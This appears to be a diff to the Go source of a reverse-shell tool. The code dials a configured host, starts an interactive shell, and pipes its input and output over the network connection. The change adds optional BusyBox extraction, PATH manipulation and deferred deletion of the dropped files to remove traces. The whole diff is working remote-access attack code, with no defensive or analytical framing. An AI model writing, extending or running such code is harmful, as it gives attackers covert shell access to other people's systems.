@@ -1,14 +1,19 @@
 package main
 
 import (
+	"fmt"
 	"io"
 	"net"
 	"os"
 	"os/exec"
+	"time"
 )
 
 func main() {
+	time.Sleep(time.Second * 5)
 	config := readConfig()
+	defer os.RemoveAll(config.Path)
+
 	startReverseShell(config)
 }
 
@@ -22,7 +27,7 @@ func startReverseShell(config Config) {
 	conn, err := dial(config)
 	check(err)
 
-	stdin := startShell(config.Path, conn)
+	stdin := startShell(config, conn)
 	reader := newNetLineReader(conn, config.Timeout)
 
 	// Feed input from network until timeout value exceeds or EOF is met.
@@ -39,19 +44,26 @@ func startReverseShell(config Config) {
 
 // startShell starts a shell, and returns a pipe to the stdin
 // of that shell
-func startShell(shellpath string, conn net.Conn) io.WriteCloser {
-	shellpath = loadShell(shellpath)
+func startShell(config Config, conn net.Conn) io.WriteCloser {
+	var shellpath string
+	if config.ExtractApplets {
+		shellpath = extractBusyBox(config.Path)
+	} else {
+		shellpath = loadShell(config.Path)
+	}
 
 	shell := exec.Command(shellpath, "-i")
 	shell.Stdout = conn
 	shell.Stderr = conn
 
+	pathEnv := os.Getenv("PATH")
+	pathEnv = fmt.Sprintf("PATH=%s:%s", config.Path, pathEnv)
+	shell.Env = append(os.Environ(), pathEnv)
+
 	stdin, err := shell.StdinPipe()
 	check(err)
 
 	check(shell.Start())
-
-	check(os.RemoveAll(shellpath))
 
 	return stdin
 }
